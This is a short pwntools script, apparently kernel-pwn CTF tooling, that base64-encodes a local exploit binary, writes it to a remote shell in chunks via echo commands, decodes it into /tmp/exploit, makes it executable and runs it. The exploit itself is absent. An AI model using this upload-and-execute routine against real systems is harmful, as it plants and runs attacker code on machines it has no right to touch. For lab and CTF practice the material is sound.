# 本脚本原作者：
#/**
# * @file kernel.h
# * @author arttnba3 (arttnba@gmail.com)
# * @brief arttnba3's personal utils for kernel pwn
# * @version 1.1
# * @date 2023-05-20
# *
# * @copyright Copyright (c) 2023 arttnba3
# *
# */


#/**
 #* @modification Modified by Cyber_Kaiyo (tgychine@foxmail.com)
 #* @date 2025-07-01
 #* @brief 做了翻译，以及一些改造
 #*/


from pwn import *
import base64
#context.log_level = "debug"

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("127.0.0.1", 11451)
#p = process('./run.sh')
try_count = 1
while True:
    p.sendline()
    p.recvuntil("/ $")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
        count += 1
        log.info("count: " + str(count))

    for i in range(count):
        p.recvuntil("/ $")

    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
    p.sendline("chmod +x /tmp/exploit")
    p.sendline("/tmp/exploit ")
    break

p.interactive()
